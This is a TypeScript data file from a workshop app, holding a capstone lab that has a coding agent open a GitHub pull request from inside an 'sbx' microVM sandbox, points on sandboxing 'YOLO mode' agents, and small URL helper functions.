3. Agent creates feat/lab-10-capstone, edits copy, commits, and runs gh pr create — or you git fetch sandbox-capstone and open the PR from the host.
4. sbx policy log --limit 20 to audit GitHub API calls.

Done when a PR exists (or branch is fetched on host), gh worked via the proxy, and policy log shows api.github.com allowed.`,
    hints: [
      'Never commit tokens — echo "$(gh auth token)" | sbx secret set -g github stores it on the host only.',
      "If gh push fails inside the VM: git fetch sandbox-capstone on the host and open the PR from there.",
      'Agent prompt: "Branch feat/lab-10-capstone. Update hero copy in workshop-data.ts. npm run build. Commit and gh pr create with a short description."',
      "sbx policy log confirms credentials were injected — you should see api.github.com without the raw token in logs.",
    ],
    steps: [
      {
        label: "GitHub secret",
        task: "Store GitHub token on the host for the credential proxy. Requires gh CLI logged in — run gh auth status first.",
        command: 'echo "$(gh auth token)" | sbx secret set -g github',
      },
      {
        label: "Clone + kit",
        task: "Start the capstone sandbox in clone mode with your kit. Use my-workshop-kit from Lab 8 or swap in ./customize/kit/workshop-app-nextjs.",
        command:
          "sbx run --clone cursor workshop-app/ --kit ./my-workshop-kit --name capstone",
      },
      {
        label: "Fetch",
        task: "Fallback if in-VM push fails: on the host, fetch the agent branch and finish the PR workflow locally with gh or git.",
        command: "git fetch sandbox-capstone",
      },
      {
        label: "Audit",
        task: "Review the last 20 outbound requests. Confirm GitHub API calls were allowed and no unexpected hosts were contacted.",
        command: "sbx policy log --limit 20",
      },
    ],
  },
] as const;

export const yoloPoints = [
  {
    title: "The problem",
    body: "YOLO mode lets agents run shell commands, install packages, and edit files without asking. Powerful — and dangerous on your host.",
  },
  {
    title: "The sbx answer",
    body: "sbx run cursor . boots a microVM. The agent goes full YOLO inside the sandbox. Your host, keys, and Docker daemon stay untouched.",
  },
  {
    title: "Default posture",
    body: "Network deny-by-default, credential proxy injection, isolated Docker Engine, and full teardown with sbx rm.",
  },
] as const;

export function labGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/tree/main/${githubPath}`;
}

export function labGuideGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/GUIDE.md`;
}

export function labReadmeGithubUrl(githubPath: string) {
  return `${workshop.githubRepoUrl}/blob/main/${githubPath}/README.md`;
}
